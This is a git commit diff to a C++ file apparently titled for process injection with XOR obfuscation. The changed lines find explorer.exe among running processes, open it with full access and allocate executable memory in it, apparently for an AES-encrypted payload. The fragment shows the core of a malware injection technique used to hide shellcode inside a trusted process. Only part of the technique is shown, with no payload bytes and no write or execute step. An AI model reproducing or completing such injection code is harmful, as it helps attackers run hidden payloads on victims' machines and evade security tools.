2501000690d440a1e41476a262be9ba63c65f889
dhanush <114467712+dagowda@users.noreply.github.com>
2024-12-27 17:12:31 -0500

    Update Processinj_XOR.cpp

--- Processinj_XOR.cpp
+++ Processinj_XOR.cpp
@@ -46,9 +46,9 @@ int main() {
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     
     Process32First(snapshot, &pe32);
-    //const char *tarproces = "explorer.exe";
+    const char *tarproces = "explorer.exe";
     while(Process32Next(snapshot, &pe32)) {
-       if (strcmp(pe32.szExeFile, "explorer.exe") == 0){
+       if (strcmp(pe32.szExeFile, tarproces) == 0){
               HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
               Sleep(2000);
               LPVOID CAMLO = VirtualAllocEx(hProcess, NULL, AESCodeLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
